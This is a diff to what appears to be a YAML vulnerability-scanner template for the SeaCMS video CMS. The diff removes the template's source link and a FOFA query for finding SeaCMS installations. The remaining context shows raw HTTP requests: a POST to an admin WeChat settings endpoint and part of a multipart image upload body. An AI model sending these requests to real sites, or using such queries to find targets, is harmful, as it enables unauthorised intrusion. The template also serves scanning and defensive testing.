@@ -3,12 +3,8 @@ info:
   name: SeaCMS海洋影视管理系统多个漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hf6g50qwb4f2w25n'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hf6g50qwb4f2w25n
-    fofa: body="http://www.seacms.net"
 http:
 - raw:
   - 'POST /at1fcg/admin_weixin.php?action=set HTTP/1.1
@@ -190,7 +186,6 @@ http:
     Content-Disposition: form-data; name="newimg"; filename=""
 
     Content-Type: image/png
-
 
 
     -----------------------------146825793124702915421087120454
